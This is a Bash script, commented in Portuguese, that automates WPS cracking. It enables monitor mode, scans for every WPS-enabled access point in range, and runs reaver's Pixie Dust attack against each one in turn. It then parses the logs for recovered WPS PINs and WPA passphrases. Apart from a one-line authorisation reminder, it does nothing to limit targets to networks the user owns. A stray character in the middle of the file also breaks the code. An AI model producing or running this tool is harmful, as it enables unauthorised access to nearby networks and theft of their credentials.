#!/bin/bash
# run_reaver_all.sh
# Uso: sudo ./run_reaver_all.sh <interface_fisica> [scan_seconds] [reaver_timeout_secs]
# Ex: sudo ./run_reaver_all.sh wlan0 10 1800
# IMPORTANTE: RODE APENAS EM REDES AUTORIZADAS

set -euo pipefail

# --- Parâmetros ---
IFACE="${1:-}"              # Interface FÍSICA (ex: wlan0)
SCAN_SECS="${2:-10}"       # Padrão de scan do wash (segundos)
REAVER_TIMEOUT="${3:-1800}"  # Padrão de timeout por BSSID (segundos, 1800s = 30 min)

# --- Variáveis Globais ---
MON_IFACE=""               # Nome da interface de monitor será definido por airmon-ng
OUT="wash_out.txt"
DONE_LOG="reaver_done.txt"
REAVER_OPTS="-K -vv"

# --- Funções ---

# Garante que o script está rodando como root
check_root() {
  if [[ $EUID -ne 0 ]]; then
    echo "[!] Este script precisa ser executado como root (use sudo)." 
    exit 1
  fi
}

# Inicia o modo monitor
start_monitor_mode() {
  echo "[*] Iniciando modo monitor na interface $IFACE..."
  
  # Mata processos que podem interferir
  airmon-ng check kill >/dev/null 2>&1 || true
  
  # Tenta iniciar o modo monitor e captura a saída
  # A saída esperada é algo como "(monitor mode enabled on mon0)"
  # ou "(monitor mode vif enabled for [phy0]wlan0 on wlan0mon)"
  OUTPUT=$(airmon-ng start "$IFACE" 2>&1)
  
  # Tenta extrair o nome da nova interface de monitor
  MON_IFACE=$(echo "$OUTPUT" | grep -Eo 'monitor mode (vif )?enabled( for .*)? on [^)]+' | sed -E 's/.* on ([^)]+)\)?/\1/')
  
  if [[ -z "$MON_IFACE" ]]; then
    # Fallback se a extração falhar (comum em versões antigas)
    MON_IFACE="${IFACE}mon"
    echo "[-] Não foi possível detectar o nome da interface de monitor. Tentando fallback: $MON_IFACE"
    # Verifica se a interface de fallback existe
    if ! iwconfig "$MON_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo "[!] Falha ao iniciar o modo monitor. Saída do airmon-ng:"
        echo "$OUTPUT"
        exit 1
    fi
  fi
  
  echo "[+] Modo monitor ativado em: $MON_IFACE"
  sleep 1 # Pequena pausa para a interface estabilizar
}

# Para o modo monitor
stop_monitor_mode() {
  if [[ -n "$MON_IFACE" && -e "/sys/class/net/$MON_IFACE" ]]; then
    echo -e "\n[*] Parando modo monitor em $MON_IFACE..."
    airmon-ng stop "$MON_IFACE" >/dev/null 2>&1 || true
    echo "[+] Modo monitor desativado. Interface $IFACE restaurada."
  fi
}

# --- Verificações Iniciais ---
check_root

if [[ -z "$IFACE" ]]; then
  echo "Uso: sudo ./run_reaver_all.sh <interface_fisica> [scan_seconds] [reaver_timeout_secs]"
  echo "Ex: sudo ./run_reaver_all.sh wlan0 10 1800"
  exit 1
fi

# verificações de pré-requisitos
command -v airmon-ng >/dev/null 2>&1 || { echo "airmon-ng não encontrado. Instale (aircrack-ng suite)."; exit 1; }
command -v wash >/dev/null 2>&1 || { echo "wash não encontrado. Instale (wash/aircrack-ng suite)."; exit 1; }
command -v reaver >/dev/null 2>&1 || { echo "reaver não encontrado. Instale reaver."; exit 1; }
command -v timeout >/dev/null 2>&1 || { echo "timeout não encontrado. Instale (coreutils)."; exit 1; }
command -v jq >/dev/null 2>&1 || true # jq é opcional

# --- Execução ---

# 'trap' garante que stop_monitor_mode será chamado ao sair
# EXIT (saída normal ou erro), INT (Ctrl+C), TERM (kill)
trap stop_monitor_mode EXIT INT TERM

start_monitor_mode

# garantir arquivos
: > "$OUT"
touch "$DONE_LOG"

echo "[*] Scanning WPS APs on $MON_IFACE for $SCAN_SECS seconds (press Ctrl+C to abort)"

# roda wash em background emitindo JSON legível para $OUT
wash -i "$MON_IFACE" -s -j > "$OUT" 2>&1 & 
WASH_PID=$!
sleep "$SCAN_SECS"
if kill -0 "$WASH_PID" 2>/dev/null; then
  kill -INT "$WASH_PID" 2>/dev/null || kill "$WASH_PID" 2>/dev/null
fi
wait "$WASH_PID" 2>/dev/null || true

# imprimir redes descobertas (BSSID - ESSID), tenta jq, fallback awk/grep
echo
echo "[*] Redes descobertas:"
if command -v jq >/dev/null 2>&1; then
  jq -r '
    (if type=="array" then .[] else . end)
    | (.bssid // .BSSID // "") as $b
    | (.ssid // .essid // .SSID // "<hidden>") as $s
    | select($b != "") | ($b + " - " + $s)
  ' "$OUT" 2>/dev/null | sort -u || true
else
  awk -F'"' '/bssid|BSSID/{b=$4} /ssid|essid|SSID/{s=$4; if(b!="") print b" - "s}' "$OUT" | sort -u || true
fi

# extrai BSSIDs únicos (formato HH:HH:HH:HH:HH:HH)
mapfile -t BSSIDS < <(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$OUT" | tr '[:lower:]' '[:upper:]' | sort -u)

if [ ${#BSSIDS[@]} -eq 0 ]; then
  echo
  echo "Nenhum AP com WPS encontrado em $OUT."
  # O 'trap' cuidará de parar o modo monitor
  exit 0
fi

echo
echo "[*] Encontrados ${#BSSIDS[@]} BSSID(s). Iniciando reaver sequencialmente."

for B in "${BSSIDS[@]}"; do
  # nome de arquivo seguro
  SAFE_B=$(echo "$B" | tr ':' '-')
  LOGFILE="reaver_${SAFE_B}.txt"

  # pular se já finalizado com sucesso (marca em DONE_LOG)
  if grep -Fxq "$B" "$DONE_LOG"; then
    echo "[=] $B já processado anteriormente. Pulando."
    continue
  fi

  echo -e "\n=== Reaver contra $B ==="
  echo "[+] Log: $LOGFILE"
  echo "[+] Timeout: ${REAVER_TIMEOUT} segundos"

  # Roda reaver com timeout.
  if ! (timeout --foreground "$REAVER_TIMEOUT" reaver -i "$MON_IFACE" -b "$B" $REAVER_OPTS | tee "$LOGFILE"); then
    STATUS=${PIPESTATUS[0]} # Captura o status do 'timeout' (graças ao pipefail)
    if [ "$STATUS" -eq 124 ]; then
      echo "[!] $B atingiu o timeout de ${REAVER_TIMEOUT}s. Seguindo para o próximo."
    elif [ "$STATUS" -ne 0 ]; then
      echo "[-] $B: Reaver encerrou com código $STATUS (sem ser timeout). Verifique $LOGFILE."
    fi
  else
    echo "[*] $B: Reaver terminou antes do timeout."
  fi

  # tentar extrair PIN e PSK do log (O log é analisado independentemente de ter dado timeout)
  PIN=""
  PSK=""

  # heurística 1
  if grep -Ei "WPS PIN|WPS pin" "$LOGFILE" >/dev/null 2>&1; then
    PIN=$(grep -Ei "WPS PIN|WPS pin" "$LOGFILE" | head -n1 | grep -Eo '[0-9]{7,8}' || true)
  fi

  # heurística 2
  if [ -z "$PIN" ]; then
    PIN=$(grep -Ei "pke::|WPS PIN|pin:" "$LOGFILE" | grep -Eo '[0-9]{7,8}' | head -n1 || true)
  fi

  # heurística 3
  PSK=$(grep -Ei "WPA PSK|WPA Key|WPA passphrase|Passphrase|PSK" "$LOGFILE" | sed -n '1p' | sed -E 's/.*[:= ]+["'"'"']?([^"'"'"' ]{8,})["'"'"']?.*/\1/p' || true)

A
  # heurística 4
  if [ -z "$PSK" ]; then
    PSK=$(grep -Eo '[[:alnum:]\!\@\#\$\%\^\&\*\(\)\-\_\=\+\[\]\{\}\;\:\,\.\/\?\\\|]{8,}' "$LOGFILE" | head -n1 || true)
  fi

  # se encontrou algo, registra e imprime
  if [[ -n "$PIN" || -n "$PSK" ]]; then
    echo "$B" >> "$DONE_LOG"
    echo "[+] $B marcado como concluído (possível PIN/PSK encontrado)."
    if [[ -n "$PIN" ]]; then
      echo "[PIN] $PIN"
      echo "[PIN] $PIN" >> "$LOGFILE"
    fi
    if [[ -n "$PSK" ]]; then
      echo "[PSK] $PSK"
      echo "[PSK] $PSK" >> "$LOGFILE"
    fi
  else
    echo "[-] $B finalizado (ou timeout) sem indicação clara de PIN/PSK na saída. Verifique $LOGFILE."
  fi

  # pequeno delay entre tentativas para estabilizar hardware
  sleep 2
done

echo -e "\n[*] Processo completo. Logs: $(ls -1 reaver_*.txt 2>/dev/null || echo 'nenhum')"
echo "[*] BSSIDs finalizados (arquivo $DONE_LOG)."

# A função 'stop_monitor_mode' será chamada automaticamente aqui pelo 'trap EXIT'
